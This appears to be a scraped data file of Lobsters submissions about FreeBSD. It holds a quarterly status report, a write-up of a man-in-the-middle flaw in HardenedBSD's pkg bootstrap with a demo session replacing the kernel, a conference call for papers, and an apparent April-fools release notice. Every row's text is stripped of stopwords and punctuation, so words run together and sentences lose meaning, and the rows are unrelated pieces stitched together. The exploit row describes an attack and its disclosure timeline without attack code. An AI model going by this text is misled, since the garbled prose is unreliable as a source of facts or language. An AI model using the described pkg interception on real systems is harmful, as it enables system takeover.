fbsdes raycherng gmailcom wblock freebsdorg faq porter handbook open task start thread bhd freebsdorg bcr freebsdorg jkois freebsdorg open task bdrewery freebsdorg pr open task gonzo freebsdorg open task deb freebsdfoundationorg list donor material available scott long sean bruno longstanding relationship freebsd zfs freebsd riscv work netflix freebsd power serve community new look news home status home,introductionthe first quarter showed freebsd retains strong sense ipseity improvement pervasive lending credence concept meliorismpanegyrics relatively scarce lack need perhaps missive might serve function infinitesimal waythere propagation reformation randomization accumulation emulation transmogrification debuggenation metaphrasal quarterin financioartistic arena pork snout future narrowly edged pointilism parietal art remained fixedin discomfiture abundance view rubric marvel profusion magnitude marvel blockplease submit status report second quarter july thesaurus provided submitter one need back afterwards preferably new teeth mark cover thank contact clusteradm freebsdorg quarter migrated service hosting space isc peter sbruno began migration service rootbsd hosting space peter sbruno collaborated phabricator admin team migrate new improved host nyi allanjude peter sbruno installed new beefier jenkins machine gnn lwshu sbruno still looking asian mirror pkg svn ftp japan india sbruno completed migration taiwanese mirror new location lwshu started hosting clangllvm buildbbot freebsd cluster nyi sbruno emaste resolved uk mirror outage bytemark gavin peter contact freebsd core team core freebsdorg first quarter important business freebsd core team respond harassment incident last year core action assemble timeline event light review core action time make recommendation better handle case future process draft report reviewed people concerned case addition number interested member freebsd community core would like thank everyone involved contribution report published freebsd developer community midfebruary contained six recommendation community consider core also coordinating committee headed anne dickison reviewing code conduct corpus case study assembled reexamined see impact change code conduct would core together john baldwin working plan create separate repository containing toolchain component allow modernization code within base beyond existing toolchain handle permit support certain new architecture copyfree licensed alternative ie llvm yet available position paper soon circulated developer comment quarter three new commit bit issued one returned safekeeping please welcome wojciech macek jared mcneil stanislav galabov bid farewell davide italiano although busy work freebsd directly still contributing work upstream lld part toolchain contact konstantin belousov kib freebsdorg contact ed maste emaste freebsdorg wrote small straightforward yet featurepacked patch implement aslr freebsd available broader testing change randomization applied nonfixed mapping randomization mean base address mapping selected guaranteed amount entropy bit mapping requested superpage aligned randomization honor superpage attribute randomization done besteffort basis allocator fall back first fit strategy fragmentation prevents entropy injection trivial implement strong mode failure guarantee requested amount entropy result failure mapping request failure consider usable finetuned amount entropy injected right quantitive change change implementation current amount controlled aslrpagesrnd spoil coalescing optimization reduce page table fragmentation inherent aslr retain transient superpage promotion malloced memory locality implemented anonymous private mapping automatically grouped fragmentation kick initial location anon group range course randomized additional tuning measure appeared quite effective particular addressspacehungry build pypy successfully finished aggressive functionality patch activated default mode keep sbrk area unpopulated mapping turned give much breathing room small addressspace architecture funny bit considered small tied question following application hint mmap base address testing show ignoring hint affect function common application would expect demanding code could break default sbrk preserved mmap hint satisfied changed using kernelf aslrcaresbrk sysctls currently enabled default wider testing stack gap wx shared page randomization kaslr technique explicitly scope work paxtest result run previous version patch applied aggressively tuned seen paxtestlog comparison run fedora machine fedoralog aslr enabled perabi basis currently enabled native including compat abis expect test enable aslr well later procctl control aslr implemented provided userspace wrapper around syscall fact reasonable control needed perimage perprocess tradition put kernelread attribute extattrs binary still pondering part also explains nonwritten tool thanks oliver pinter shawn webb hardenedbsd project pursuing aslr freebsd although work based inspired effort thanks ed maste robert watson john baldwin alan cox discussion patch freebsd foundation directing bartek rutkowski tested pypy build david naylor helped port point turbulence upgrade work project sponsored freebsd foundation contact willem jan withagen wjw digiwarenl ceph distributed object store file system designed provide excellent performance reliability scalability object storage ceph provides seamless access object using native language binding radosgw rest interface compatible application written swift block storage ceph rados block device rbd provides access block device image striped replicated across entire storage cluster file system ceph provides posixcompliant network file system aim high performance large data storage maximum compatibility legacy application started looking ceph hast solution carp ggate really wanted aiming running ceph storage cluster storage node running zfs end station would running bhyve rbd disk stored ceph freebsd build build tool ceph note rbddependent item work since freebsd rbd yet compiling building ceph tested us clang toolset available need least clang required capability compile everything setup get thing running freebsd install bash link bin requires root privilege sudo pkg install bash sudo ln usrlocalbinbash binbash building ceph git clone http githubcomwjwithagencephgit cd ceph git checkout wipwjwfreebsdtests dofreebsdsh part yet included rbd rados block device implemented linux kernel seems used userspace implementation first perhaps ggated could used template since function two disk userspace counterpart bluestore freebsd linux different aio api need made compatible next discussion freebsd aiocancel working device type cephfs cython try access internal field dirent compile test verify correct working also excluded test set test yet included cephdetectinitruntoxsh current implementation know anything freebsd rcinit test make use nosestests calling really work since nosetests usrbin calling usrbinenv nosetests work freebsd testpybindtestcephargparsepy testpybindtestcephdaemonpy thing investigate ceph osd mon need two signal actually terminate cepherasurecode debugosd pluginexists jerasure crash due sigsegv pointer reference get modified outside regular programflow probably due programming error perhaps wrong mixing matching many library open task current foremost task get test set complete without error includes fixing several coredumps run integration test see freebsd daemon work linux ceph platform get python test currently excluded work test oke compile test user space rbd rados block device investigate see inkernel rbd device could developed akin ggate integrate freebsd etcrcd init script ceph stack testing running ceph production machine contact konstantin belousov kib freebsdorg posix specifies several kind pthread lock report private processshared variant considered private lock used thread process share single common address space processshared lock used thread process assuming process map lock memory address space libthr library implementing posix thread locking operation us pointer internal representation behind lock pointer contains address actual structure carrying lock unfortunate consequence implementing pthreadprocessshared attribute lock since really pointer shared lock mapped distinct address space common opinion choice break libthr application binary interface abi changing lock type actual lock structure padding future abi extension painful user previous experience nonversioned libc libcr shown instead proposed implemented scheme processshared lock implemented without breaking abi lock memory used key systemglobal hash shared memory object offpages contain actual lock structure new umtx operation create look shared object memory key added libthr modified look object use shared lock instead using malloc private lock pointer value uservisible lock type contains canary shared lock libthr detects canary switch sharedlock mode proposal inlining lock structure besides drawback breaking abi merit important inlining avoids need indirection another important advantage offpage approach offpage object need maintained lifecycle shared lock naturally finish destruction shared memory without need explicit cleanup right offpages hook vm object termination avoid leakage longlivedness vnode vm object prolongs offpage existence shared lock backed file however unlikely may libthr inlined lock became informally known project since better change library name bumping library version rtld ensure libthr simultaneously loaded single address space project sponsored freebsd foundationopen task implement robust mutexes evaluate implement contact edward tomasz napierała trasz freebsdorg important missing piece rctl resource limit framework ability limit file system throughput project aim fill hole making possible add rctl rule read byte per second bps write bps read io operation per second iop write iop adding new throttling mechanism slow offending process limit get hit code committed ship freebsd project sponsored freebsd foundationopen task additional testing simplify locking getting rid rctllock altogether improve statistic gathering making possible rctl u retrieve usage counter fixed point time use new throttling mechanism cpu limit contact freebsd graphic team freebsdorg major news quarter update driver kernel driver match linux includes initial haswell support linux already three year old work continues upgrade drm particular work commenced move using linuxkpi compatibility port tree mesa updated next minor release ready testing development tree also updated libclc library used mesa provide opencl support upstream patch added beignet port use llvm version attended fosdem brussels jeansébastien pédron gave talk explain work graphic team show people contribute well received presentation followed interesting discussion fosdem also nice occasion meet talk nice upstream developer graphic stack first year added two idea gsoc one kernel task one redesign libdevq six student submitted proposal idea unexpected need decide one want mentor choice difficult blog moved new location linked open task see graphic wiki page uptodate information contact jared mcneill jmcneill freebsdorg contact emmanuel vadot manu bidouillistecom allwinner socs used multiple hobbyist devboards singleboard computer recently support socs received lot update task done first quarter hdmi output basic support power management unit switch upstream dts board basic support soc rtc proper pinmuxgpio support audio codec audio hdmi dma support us gic general interrupt controller us arm generic timer ongoing task switch new clock framework review convert interrupt controller intrng review ohci support review generic allwinner kernel config file review nmi support review usb otg finish switch using upstream dts file soc support soc support open task spi driver lcd support unsupported hardware device might interest contact warner losh wlosh netflixcom enhanced cam io scheduler committed tree default scheduler implement old behavior addition advanced adaptive scheduler available along scheduler sata disk use queued trim device support detail new scheduler available io scheduling freebsd cam subsystem article pdf bsdcan talk adaptive io scheduler disabled default enabled option camadaptiveiosched kernel config file scheduler allows favoring read writes vice versa controlling iop bandwidth concurrent operation read write trim permit selection static dynamic control operation addition number statistic collected drive operation published via sysctl one advanced use adaptive io scheduler compensate deficiency consumergrade ssds ssds exhibit performance cliff much data written quickly due internal garbage collection without io scheduler read write performance drop substantially garbage collection kick adaptive io scheduler configured monitor read latency read latency climb io scheduler reduces allowed write throughput within limit attempt maximize read performance simple use adaptive io scheduler would limit write bandwidth iop concurrent operation statically future work io scheduler coupled improvement upper layer upper layer enhanced communicate urgent io request io scheduler inform upper layer full io queue le urgent io submitted lower layer quickly possible without overwhelming lower layer starving device request project sponsored netflix contact oleksandr tymoshenko gonzo freebsdorg flattened device tree way keep hardware description separated code boot process loader pass pointer devicetree blob kernel kernel instantiates attache driver according information blob approach work hardware expandable example raspberry pi beaglebone black concept cape shield snapon pcbs connected io header main board provide additional functionality like lcd screen gps receiver shield described device tree tree overlaid base tree boot loader thus providing accurate description kernel proposed patch add functionality ubldr user specify commaseparated list overlay uboot loader fdtoverlays variable ubldr load bootdtb directory overlaying contact bryan drewery bdrewery freebsdorg contact mateusz guzik mjg freebsdorg filemon kernel module tracing file command creates read writes executes allows tracking build dependency combination bmake meta mode bmake store filemon output meta file along build command later us trigger rebuild target file referenced missing modified build command change provides functionality compiler mf flag everything critical buildworld withmetamode normal buildworld using filemon provide reliable incremental build without even need depend file compiler mf flag allows dnoclean work time filemon head improved stability performance quarter longer cause every syscall hook loop process looking matching filemon struct attache directly struct proc pointer improves performance reducing lock contention build much work went improving error handling stability issue module well work done bryan drewery sponsored emc much help identification bug provided mateusz guzik project sponsored emc isilon storage divisionopen task improve credential handling improve eventhandler performance possibly provide framework syscallentersyscallret hooking avoid need hook syscalls filemon contact sepherosa ziehau sepherosa gmailcom contact howard su gmailcom contact hongjiang zhang honzhan microsoftcom contact dexuan cui decui microsoftcom freebsd virtual machine vms run hyperv using hyperv synthetic device recommended get best network storage performance make full use benefit hyperv provides collection driver required use hyperv synthetic device freebsd known freebsd integration service bi bi driver like network storage driver existed freebsd year still performance stability issue bug compared window linux vms current bi lack useful feature eg live virtual machine backup trimunmap support uefi vms boot uefi etc past quarter made great progress performance tuning hyperv network driver also refactored cleaned vmbus driver fixed important bug work make freebsd vms run even better hyperv hyperv based cloud platform azure work documented optimizing performance hyperv network driver added lro large receive offloading support driver properly handle ack packet effectively reduces cpu cycle used tcpip stack dramatically boost network performance enabled vrss virtual receive side scaling support driver greatly improved network performance smp virtual machine used separate tx kernel thread relieve rx thread transmitting packet rx thread tried transmit packet receiving acks rx thread receive packet send acks faster reach vmtovm throughput host physical nic host nic plenty cpu cycle left application also enabled ip header checksum offloading rx checksum offloading udp performance tuning working progress refactoring cleaning vmbus driver code instead using swi thread directly use percpu taskqueuecreatefast thread event message handling making code conventional freebsd lot cleanup hvutils code heartbeat timesync shutdown cleaning kvp code used new messageinterrupt slot hyperv timer handling timer nontimer message distinguished fixing potential issue instead finding available idt vector hacking changing use normal method lapicipialloc modularizing hyperv module loaded loader going enhance devd improve hot plug case bug fixing fixed spurious multiple disk issue pr freebsd window server may boot due multiple invalid disk hyperv storage driver freebsd vms reliably boot host fixed oactive issue pr hyperv freebsd hyperv lost network heavy load oactive fixed tsc calibration issue pr hyperv tsc frequency correctly detected calcru runtime went backwards see runtime went backwards message fixed slow terminal issue enabling text mode running hypervisors fixed unknown dhcp option value issue dhclient asking dhclient ignore option freebsd vms azure reliably get ip address found workaround pr hyperv vm network may work virtual switch based wireless nic add etcsysctlconf plan add support live virtual machine backup trimunmap uefi vms hyperv vms published erratum release engineering team user easily get fix kvp tcp checksum upgrading system published bi test case hyperv github http githubcomfreebsdonhypervtestbis going publish test case azure soon project sponsored microsoft contact han petter selasky hselasky freebsdorg mellanox working big infiniband update towards mellanox ofed infiniband stack freebsd update include userland kernel component infiniband patch freebsd available link downloaded applied recent freebsdhead checkout project sponsored mellanox technology contact ilya bakulin ilya bakulinde goal project reimplement existing mmcsd stack using cam framework permit utilizing welltested cam locking model debugging feature also possible process interrupt generated inserted card prerequisite implementing sdio interface sdio support necessary communicating wifibt module found many development board like wan raspberry pi another feature new stack support sending sd command userland application using cam allow building device driver userland make debugging much easier first version code uploaded phabricator review new stack able attach sd card bring operational state possible read write card support imxsdhci sd host controller used imxbased board example wandboard added along tisdhci used beaglebone black modifying sdhcicompliant driver difficult open task modify sdhci driver least one platform make development collaboration easier begin implementing sdiospecific bit contact rick macklem rmacklem freebsdorg new managegids option added nfsuserd daemon option tell nfs server use list group uid server list group nfs rpc request use option avoids group limit nfs rpcs using authsys default work ongoing respect development pnfs support nfs server using glusterfs back end longterm project eventual goal allowing nfs server scale beyond single server system hopefully available testing late spring pnfs allows client readswrites directly data server nfs server open task pnfs server need testing development never progress nearproduction status hope code available freebsd subversion project branch testing late spring contact warren block wblock freebsdorg february program verification system used pvsstudio tool run static analysis freebsd kernel phabricator review created allow developer share comment result number bug ranging trivial typo redundant code important logic error found fixed result false positive several addressed changing code misled static analyzer could also mislead human reader cooperation program verification system offer opensource project like freebsd benefit everyone thank sharing analysis insight u contact justin hibbits jhibbits freebsdorg project continuation booke qoriq support enhancement semihalf dating back amigaone series amigaoscompatible system us freescale qoriq series socs desktopclass form factor work entail adding support core addition support soc peripheral currently code enable basic support checked dtsec ethernet core support part rman kernel resource manager enhanced use uintmaxt resource allows device physically boundary system statically compiled device tree boot multiuser mode nfsroot used normal serial ssh logins configured project sponsored alex perez inertial computing open task esdhc driver work started hijacking imxsdhcc ian lepore still bug missing dma imx driver odd timeouts system start sata support wip driver sata controller currently slow sata link currently relies delay every sata transaction even somewhat stable without delay disk scan never work yet figured local console vga support currently boot serial console seen pcie graphic card vt attach yet support cpu board dualcore soc currently booke support freebsd smp smp support booke hardware currently broken uboot support currently us compiledin device tree would preferable use device tree provided uboot least linuxcompatible device tree work needed dpaa front datapath acceleration architecture improve ethernet driver utilize sec engine crypto random ipsec contact dominik ermel der semihalfcom contact wojciech macek wma semihalfcom contact zbigniew bodek zbb semihalfcom since last report freebsd support thunderx significantly improved stabilized semihalf contribution include following item support newest thunderx chip revision pas current cavium firmware backward compatibility maintained moved using pcihostgenericc main driver internal pcie bridge involved significant rework pcie code support generic thunderx based platform serious networking performance boost bug fix fixed race condition rx path causing rare use free issue hardware checksum support hardware assisted tcp segmentation offloading tso support software large receive offload lro various improvement tx rx path configuration driver support available ethernet connection gbps system saturate gbps link tx using cpu core significantly improved overall io performance complete rework copyincopyout bzero functionality improvement support interrupt cpu binding including backends work integrated freebsd head ongoing basis project sponsored cavium semihalfopen task add support multiqueue set operation vnic contact justin hibbits jhibbits freebsdorg project aim enable use signal processing engine found nxpfreescale soc spe us opcodes overlapping altivec mutually exclusive additionally traditional fpu instead us spe floating point operation emulation currently done combined fact spe abi incompatible traditional abi new machinearch created address incompatibility project branch created work powerpcspe kernel boot routerboard base utility run properly open task potentially optimizing setjmplongjmp use spe unless already enabled would save kernel switch process otherwise use spe low priority task may completed contact ed maste emaste freebsdorg elf tool chain project provides bsdlicensed implementation compilation tool library building analyzing elf object project began part freebsd later became independent project encourage wider participation others opensource developer community elf tool chain project released version february tracking snapshot upstream repository freebsd official release brings benefit broader testing visibility within open source project even require order update freebsd first quarter elf tool chain tool updated snapshot upstream subversion revision close release additional bug fix committed freebsd subsequently merged upstream repository elf tool chain elfcopy installed objcopy default viable replacement base system port tree significant improvement made elfcopy readelf elfdump tool including better mips riscv support project sponsored freebsd foundationopen task fix issue found fuzzing input tool add automatic support separate debug file investigate replacement objdump ld implementation contact john baldwin jhb freebsdorg new implementation support native pciexpress hotplug present url much new code life pcipci bridge driver handle hotplug event manage pciexpress slot register additional change branch include adding new rescan delete command devctl well support rescanning pci bus current implementation tested system expresscard slot could use additional testing especially system pciexpress hotplug feature mechanical latch attention button indicator open task split branch separate logical change commit candidate additional testing contact john baldwin jhb freebsdorg new thread target directly us ptrace committed upstream included gdb port also updated gdb open task figure powerpc kgdb target able unwind stack past initial frame add support platform arm mips upstream gdb userland kgdb add support debugging powerpc vector register add support catching system call add support siginfo add support elf auxv data via info auxv implement info o command implement gdbserver freebsd contact rafael espíndola rafaelespindola gmailcom contact davide italiano davide freebsdorg contact ed maste emaste freebsdorg lld linker llvm family project intended highperformance linker support elf coff macho object format possible lld maintains commandline functional compatibility existing linkers gnu bfd ld gold lld author constrained strict compatibility would hamper performance desired functionality upstream lld project made significant progress adding new functionality lld elf support first quarter lld elf linker capable selfhosting capable linking many test application highlight upstream development quarter include lld gained link time optimization lto support able link clang lto relocation code overhauled better maintainability improvement linker script support including better diagnostics many bug fix mips support lld currently lack comprehensive linker script expression evaluation support therefore yet used link freebsd kernel also lack versioned symbol support implement option used freebsd boot loader component ed running experimental world build lld installed place ldbfd linker workarounds current gap functionality using withoutsymver option disable symbol versioning use linking loader component gnu ld lld able link working freebsd userland project sponsored part freebsd foundationopen task enable lld option default llvmdevel later llvm port testing develop symbol version support linker script expression improvement upstream lld project add improve support remaining freebsd architecture import newer lld snapshot vendor area add build infrastructure connect world build installed ldlld request port exprun usrbinld symlink ldlld extensive testing contact torsten zühlsdorff port tocodomainsde nearly year work project gitlab committed port tree big thanks enormous number people involved since gitlab fastmoving project also ongoing work stay sync upstream fun contact freebsd gnome team freebsdgnome freebsdorg freebsd gnome team maintains gnome mate cinnamon desktop environment graphical user interface freebsd gnome part gnu project mate fork gnome desktop cinnamon desktop environment using gnome technology gnome look feel quarter gnome mate committed port tree bsdgnomemk bsdmatemk framework replaced simpler usesgnomemk usesmatemk style open task tracking mate development version become mate work started porting gnome cinnamon development tree time properly test fix issue cinnamon committed port interested helping taking maintainership cinnamon please let u know contact kde freebsd team kde freebsdorg kde freebsd team focus packaging making sure experience kde qt freebsd good possible list update shorter previous quarter team remained busy work kde framework plasma continues tobias berner driving kde framework plasma effort beginning received kde commit bit putting good use upstreaming freebsd across several kde repository another team highlight beginning year addition another committer experimental repository adriaan de groot longtime kde contributor also used work kde freebsd almost decade ago team first formed welcome back ade following big update landed port tree quarter many case also contributed patch upstream project cmake calligra latest release integrated work application suite managed keep sync upstream release since kde telepathy updated updated latest upstream release qt port finally updated latest stable version time first commit preparing groundwork kde framework plasma landed port tree work qt way experimental repository time writing also contains kde framework plasma kde application user interested testing port encouraged follow instruction website report result mailing list branch plasma rest branch open task land kde framework plasma port tree commit digikam update currently worked experimental repository contact torsten zühlsdorff port tocodomainsde ruby rail base rubygems port collection currently version coexist since rail running support time come switch ongoing progress remove rail port tree many gem already work new version exception example wwwredmine need big update currently tested depends gem depends rail want help porting testing feel free contact mailinglist ruby freebsdorg contact frederic culot portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg end port tree hold bit port pr count activity port tree remains steady almost commits performed around active committers problem report front encouraging trend observed previous quarter confirmed significant increase number pr fixed indeed almost report fixed allows u go threshold value open pr three commit bit taken safekeeping following inactivity period month milki brian committer request mmoll one returning committer fluffy commit bit reinstated two new developer granted port commit bit olivier cochardlabbe christoph moenchtegeder management side pleasure welcome miwi back portmgr team qa side expruns performed validate sensitive update cleanup noticeable change might removal unneeded portsdir specifying dependency makefiles see usrportschanges entry dated amongst noticeable change update ruby rubygems cmake clang gnome boost update libc base release enabling llvm libunwind default centos port also updated infrastructure change included switch bsdgnomemk bsdmatemk simpler usesgnomemk usesmatemk work also done improve poudriere build reducing dependency calculation general overhead open task would like remind everyone port tree built run volunteer help greatly appreciated great amount effort spent port front allowed u decrease number pending problem report significantly well port infrastructure many thanks contributed contact michael lucas mwlucas michaelwlucascom contact allan jude allanjude freebsdorg two new freebsd mastery book freebsd mastery specialty filesystems michael w lucas longawaited freebsd mastery advanced zfs lucas allan jude book available print ebook format bundle containing freebsd mastery book available discount tiltedwindmillpresscom open task write book contact federico caminiti demianfc gmailcom contact carlos j puga medina cpm fbsdes contact rueycherng yu raycherng gmailcom contact warren block wblock freebsdorg federico caminiti created entirely new spanish translation faq editorial help carlos j puga medina landmark accomplishment mark first use new po translation system translate entire book rueycherng yu begun ambitious traditional chinese zhtw translation porter handbook half string book translated far open task help add improve translation freebsd document spanish start freebsdtranslators thread help add improve translation freebsd document chinese language contact björn heidotting bhd freebsdorg contact benedict reuschling bcr freebsdorg contact johann kois jkois freebsdorg freebsd german documentation project translates freebsd documentation handbook article website etc german language due tireless effort björn heidotting made huge improvement catching translation german handbook benedict helped reviewing change using freebsd review system phabricator helped lot following handbook chapter sync latest version english tree filesystems kernelconfig port try keep good work also looking new way translate like pogettextbased system always looking volunteer interested translating small section even entire document process relatively easy contributor know much get started member freebsd german documentation team also willing mentor people interested helping open task translate document contact bryan drewery bdrewery freebsdorg build improvement buildworld freebsd head continue highlight include withfastdepend made default later made option new depend code avoids make depend tree walk generates depend file build sideeffect compilation done using mf flag compiler speed build pr withoutcrosscompiler fixed properly use sysroot allows option work case still unsafe major compiler upgrade occur work planned improve still withouttoolchain properly build project sponsored emc isilon storage divisionopen task opportunistically skipping bootstrap compiler phase buildworld skipping make obj tree walk enabling withmetamode buildworld provide reliable incremental build using filemon bmake makemodemeta confused withdirdepsbuild previously named withmetamode drastically different build system presented bsdcan simon gerraty contact oleksandr tymoshenko gonzo freebsdorg qt great framework building embedded gui application qt released natural bring raspberry pi current qt support port xorgcentric proof concept created experimental configured generic arm device scfb video driver specifically raspberry pi case support eglfs mode hardware opengl acceleration open task check embedded use case fit current bsdqtmk whether new port introduced contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage development project conference developer summit provide travel grant freebsd developer foundation purchase hardware improve maintain freebsd infrastructure publishes freebsd white paper marketing material promote educate advocate freebsd project foundation also represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter fundraising effort raised last quarter individual corporate donor thank everyone made donation year list donor available o improvement foundation improves freebsd funding software development project approved proposal submission process three software developer staff member two foundationfunded project started last quarter first improve stability vnet network stack virtualization infrastructure second phase two port project foundation staff member responsible many change quarter notable item include processshared pthread lock address mapping randomization disk io bandwidth limit porting libunwind freebsdarm bug fix autofs automount daemon updated version elf tool chain investigation lld linker improved hardware support vm subsystem stability improvement several project described elsewhere quarterly report release engineering foundation employee release engineer glen barber worked packaging base system pkg separating debug file default base system selected deselected install supporting preparation testing ontime release freebsd producing snapshot build freebsd advocacy anne dickison marketing director focused creating updating marketing material promote teach people freebsd material available freebsd advocate hand conference event promote freebsd also worked promoting freebsd work done social medium blog post article last quarter continued face freebsd series publishing story scott long sean bruno opportunity put face name freebsd community get know people contribute freebsd work began updating freebsd brochure include new feature love getting story company successfully using freebsd testimonial received last quarter chelsio acceleration system zfs making headline wrote blog entry longstanding relationship freebsd zfs helped promote freebsd riscv work done assistance provided mellanox press release highlighting work netflix conference event freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group provide financial support major bsd conference like bsdcan asiabsdcon eurobsdcon give financial andor support smaller event like bsddays freebsd summit freebsd workshop camp hackathons open source conference attend get free nonprofit booth year kicked sending ed maste benedict reuschling george nevilleneil promote give talk freebsd fosdem largest open source conference europe ed project development director chance talk developer project based freebsd various people reproducible build freebsd dru lavigne deb goodkin promoted freebsd scale pasadena california dru gave presentation called doc like egyptian gold sponsor asiabsdcon tokyo five foundation member attended kirk mckusick taught twoday freebsd kernel tutorial gave talk history bsd filesystem dru lavigne benedict reuschling gave documentation tutorial board member hiroki sato george nevilleneil helped organize conference bsdnowtv interviewed benedict asiabsdcon role new foundation board member foundation work planned organized firstever freebsd storage summit association usenix fast conference led president founder justin gibbs attendee participating working together technically focused topic benedict busy promoting freebsd europe also attended linuxtage chemnitz germany give talk freebsd german freebsd power serve community foundation committed gold sponsor bsdcan upcoming hackathondevsummit essen germany april legalfreebsd ip foundation owns freebsd trademark responsibility protect continued review request permission use trademark freebsd community engagement code conduct anne dickison marketing director overseeing effort rewrite project code conduct help make safe inclusive welcoming community reaching open source community get help effort making diverse community help u achieve goal mentioned making freebsd community safe inclusive welcoming continuing diversity effort connecting woman technology group work recruit woman freebsd offer intro freebsd workshop meeting held number commercial vendor help facilitate collaboration project included presenting project organized company get help contribute back project promote use freebsd u get feedback work help fundraising effort new foundation website logo launched signaling ongoing evolution foundation identity ability better serve freebsd project community find new look news home status home
557,Lobsters,freebsd,FreeBSD,"Installing ElectroBSD the ""hard"" way ... by exploiting HardenedBSD",https://www.fabiankeil.de/gehacktes/hardenedbsd/,installing electrobsd hard way exploiting hardenedbsd,wwwfabiankeilde installing electrobsd way exploiting hardenedbsd hardenedbsd introduction bad news pkg importing pkg fix freebsd etcpkghardenedbsdconf amusing news electrobsd hard way demo kernel bootstrapping pkg freebsd root hardlyhardenedbsd somebody set u bomb kernel update complete aslr electrobsd ownedbsd root ownedbsd privoxy disclosure timeline electrobsd patch land freebsd report next tweet erratum notice insufficient check unsupported pkg signature method erratum notice implement pubkey support pkg bootstrap,wwwfabiankeildegehackteshardenedbsd installing electrobsd hard way exploiting hardenedbsd according hardenedbsd introduction hardenedbsd securityenhanced fork freebsd hardenedbsd project implementing many exploit mitigation security technology top freebsd project started address space layout randomization aslr initial focal point implementing exploit mitigation technique bad news recently hardenedbsd default configuration contained somewhat serious flaw could exploited mitm intercept request pkg let execute code provided attacker privilege pkg user usually root obviously aslr protect roughly two month informed issue problem fixed importing pkg fix freebsd additionally previously vulnerable etcpkghardenedbsdconf changed use signature type actually supported pkg far know hardenedbsd user explicitly told system may compromised amusing news still vulnerable hardenedbsd copy henceforth referred hardlyhardenedbsd exploit pkg bootstrapping process let install electrobsd operating system including patched version hardenedbsd hard way may make lot sense probably make sure mitm around hopefully people find amusing get motivated rageaudit electrobsd code base similar security flaw demo kernel bootstrapping pkg exploiting bootstrapping process could look like although le prankish attacker probably would prefer make attack le obvious fk ssh hardlyhardenedbsd warning permanently added ecdsa list known host password root hardlyhardenedbsd last login wed aug freebsd hardenedbsd head wed aug edt welcome freebsd release note erratum http wwwfreebsdorgreleases security advisory http wwwfreebsdorgsecurity freebsd handbook http wwwfreebsdorghandbook freebsd faq http wwwfreebsdorgfaq question list http listsfreebsdorgmailmanlistinfofreebsdquestions freebsd forum http forumsfreebsdorg document installed system usrlocalsharedocfreebsd directory installed later pkg install enfreebsddoc language replace en language code like de fr show version freebsd installed freebsdversion uname please include output error message posting question introduction manual page man man freebsd directory layout man hier edit etcmotd change login announcement root hardlyhardenedbsd env httpproxyhttp pkg info package management tool yet installed system want fetch install yn bootstrapping pkg pkghttp please wait installing extracting somebody set u bomb shutdown shutdown pid final system shutdown message root hardlyhardenedbsd system going immediately kernel update complete aslr system shutdown time arrived connection closed remote host connection closed fk ssh hardlyhardenedbsd warning permanently added ecdsa list known host password root ownedbsd last login wed aug electrobsd electrobloat mon aug utc welcome ownedbsd root ownedbsd start vanilla hardlyhardenedbsd installation modified allow root logins ssh mitm attack done privoxy running system ssh client forwarding traffic example attack nt replace whole operating system merely replaces kernel hostname message day real attacker would use dns poisoning actually intercept traffic hardlyhardenedbsd system disclosure timeline pkg flawed signature type handling discovered patched evaluating use electrobsd problem description patch sent freebsd electrobsd upstream problem additionally reported hardenedbsd default configuration looked vulnerable receipt report confirmed hardenedbsd detail vulnerability leaked using encryption receipt report confirmed freebsd informed freebsd hardenedbsd problem scheduled disclosed following week hardenedbsd contact consider problem user uptodate hardenedbsdconf supposedly affected noticed hardenedbsd git repository still contains vulnerable hardenedbsdconf successfully tested mitm attack latest hardenedbsd snapshot sent hardenedbsd script response since freebsd security officer suggests patch committed svn problem get erratum notice scheduled released following tuesday objection electrobsd side electrobsd patch land freebsd stable branch hardenebsd twitter account report pkg bootstrap fails new installs hardenedbsd working fix eta next tweet informs hardenedbsd package problem solved please update asap freebsd release erratum notice insufficient check unsupported pkg signature method page go online freebsd release erratum notice implement pubkey support pkg bootstrap
558,Lobsters,freebsd,FreeBSD,EuroBSDcon 2016 Call for papers,https://2016.eurobsdcon.org/call-for-papers/,eurobsdcon call paper,call paper eurobsdcon â belgrade serbian republic call talk presentation proposal cfp call tutorial proposal submission,call paper eurobsdcon â belgrade serbian republic eurobsdcon european technical conference user developer bsdbased system conference take place belgrade serbiaâ tutorial held thursday friday main conference hotel shorter talk paper program saturday sunday call talk presentation proposal periodâ close sunday may call talk presentation proposal cfp theâ eurobsdcon program committeeâ inviting bsd developer user toâ submit innovative original talk proposal previously presented european conference topic interest conference include limited application architecture implementation performance security bsdbased operating system well topic concerning economic organizational aspect bsd use presentation expected minute delivered english call tutorial proposal theâ eurobsdcon program committeeâ also inviting qualifiedâ practitioner field submit proposal half full dayâ tutorial topic relevant development implementation use ofâ bsdbased system halfday tutorial expected hour fulldayâ tutorial hour tutorial held english submission proposal sent email toâ submission eurobsdconorg theyâ contain short concise text description wordsâ submission also include short cv speaker anâ estimate expected travel expense please submit proposal asâ separate email
559,Lobsters,freebsd,FreeBSD,"""it's now again possible to build current nginx sources with FreeBSD 2.2.9""",http://lists.freebsd.org/pipermail/freebsd-current/2016-April/060426.html,possible build current nginx source freebsd,freebsdannounce freebsd released ru freebsdorg http mdounin mdouninru ftp ftp http wwwfreebsdmallcom http ftp ftpfreebsdorgpubfreebsdreleases ftp ftp yourdomain http http scottl freebsdorg ru freebsdorg ru freebsdorg information freebsdcurrent mailing list,freebsdannounce freebsd released ruslan ermilov ru freebsdorg fri apr utc hi nginx committed supporting wide range bsdlike operating system release great pleasure report possible build current nginx source freebsd know many highload setup still use freebsd version fri apr maxim dounin wrote detail http branch changeset user maxim dounin mdounin mdouninru date fri apr description compatibility freebsd added rtldnow rtldglobal dlopen test rtldglobal freebsd added test fallback similar one added fallback inaddrt test change possible compile nginx freebsd minor warning assuming wnoerror sat apr scott long wrote begin pgp signed message hash great pleasure privilege announce availability freebsd release culmination seventyseven month tireless work freebsd developer user child pet significant feature release industry leader support cutting edge pci graphic adapter acceleration barrier ide drive size finally broken wd driver support unimaginable size single drive support latest highspeed fastwide controller linux emulator able run outofthebox full description release found ftp ftp availability freebsd support architecture installed directly net using bootable medium copied local nfsftp server please continue support freebsd project purchasing medium one supporting vendor following company offering freebsd based product freebsd mall inc http wwwfreebsdmallcom daemonnews inc http ca nt afford freebsd medium impatient want use evangelism purpose mean download iso image ca nt promise mirror site carry larger iso image least available following site ftp 